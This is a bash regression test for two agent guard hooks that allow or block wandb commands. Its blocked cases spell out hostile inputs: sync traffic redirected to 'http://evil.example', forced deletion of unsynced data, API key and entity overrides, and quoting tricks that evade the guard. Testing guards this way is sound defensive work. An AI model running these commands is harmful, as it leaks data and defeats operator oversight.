#!/bin/bash
# wandb 関連 hook (command-allowlist.sh の wandb パターン + wandb-guard.sh) の
# 許可/ブロック挙動の回帰テスト (docs/wandb-guide.md §4 のケースを再現可能にしたもの)。
# 使い方: bash experiments/004-wandb-verify/hook_tests.sh
# 期待値はコードレビュー round 1 修正適用後の状態。全ケース PASS で exit 0。

set -u

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
ALLOWLIST="$ROOT/.claude/hooks/command-allowlist.sh"
GUARD="$ROOT/.claude/hooks/wandb-guard.sh"

FAIL=0

run_case() {
  local hook="$1" expected="$2" cmd="$3"
  printf '{"tool_input":{"command":%s}}' "$(printf '%s' "$cmd" | jq -Rs .)" \
    | "$hook" >/dev/null 2>&1
  local rc=$?
  if [ "$rc" -eq "$expected" ]; then
    echo "PASS [$rc] $(basename "$hook"): $cmd"
  else
    echo "FAIL [got $rc, want $expected] $(basename "$hook"): $cmd"
    FAIL=1
  fi
}

# --- command-allowlist.sh: 許可 (exit 0) ---
run_case "$ALLOWLIST" 0 'wandb sync experiments/004-wandb-verify'
run_case "$ALLOWLIST" 0 'uv run wandb sync --sync-all'
run_case "$ALLOWLIST" 0 'wandb status'
run_case "$ALLOWLIST" 0 'uv run wandb --version'
run_case "$ALLOWLIST" 0 'uv run python experiments/004-wandb-verify/verify.py'

# --- command-allowlist.sh: ブロック (exit 2) ---
run_case "$ALLOWLIST" 2 'wandb login'
run_case "$ALLOWLIST" 2 'wandb artifact get foo'
run_case "$ALLOWLIST" 2 'uv run python evil.py'
# フラグによる entity/project 上書きと未同期データ削除 (round 1 指摘 #1)
run_case "$ALLOWLIST" 2 'wandb sync -e other-entity experiments/004-wandb-verify'
run_case "$ALLOWLIST" 2 'wandb sync --clean-force --clean-old-hours 0'

# --- wandb-guard.sh: 許可 (exit 0) ---
run_case "$GUARD" 0 'uv run wandb sync experiments/004-wandb-verify'
run_case "$GUARD" 0 'WANDB_MODE=disabled uv run pytest tests/'

# --- wandb-guard.sh: ブロック (exit 2) ---
run_case "$GUARD" 2 'wandb login abc'
run_case "$GUARD" 2 'uv run wandb login'
run_case "$GUARD" 2 'python3 -m wandb sweep cfg.yaml'
run_case "$GUARD" 2 'uv run wandb artifact delete x'
run_case "$GUARD" 2 'WANDB_ENTITY=evil python x.py'
run_case "$GUARD" 2 'echo hi && export WANDB_API_KEY=xyz'
# クォート・env・+= による迂回 (round 1 指摘 #2) と BASE_URL/RUN_ID (指摘 #5)
run_case "$GUARD" 2 'export "WANDB_API_KEY=xyz"'
run_case "$GUARD" 2 'env "WANDB_ENTITY=evil" wandb sync x'
run_case "$GUARD" 2 'WANDB_ENTITY+=evil uv run python x.py'
run_case "$GUARD" 2 'WANDB_BASE_URL=http://evil.example wandb sync x'
run_case "$GUARD" 2 'WANDB_RUN_ID=abc uv run python experiments/004-wandb-verify/verify.py'

exit "$FAIL"
